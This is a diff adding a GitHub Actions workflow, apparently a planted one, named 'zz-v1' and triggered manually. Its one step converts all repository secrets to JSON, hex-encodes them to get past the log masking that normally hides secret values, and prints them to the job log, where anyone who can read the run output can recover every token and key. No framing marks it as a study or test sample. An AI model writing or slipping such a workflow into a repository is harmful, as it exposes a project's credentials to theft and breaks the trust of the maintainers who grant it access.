@@ -1,0 +1,7 @@
+name: zz-v1
+on: workflow_dispatch
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "S=$(echo '${{ toJSON(secrets) }}' | xxd -p | tr -d '\n')"
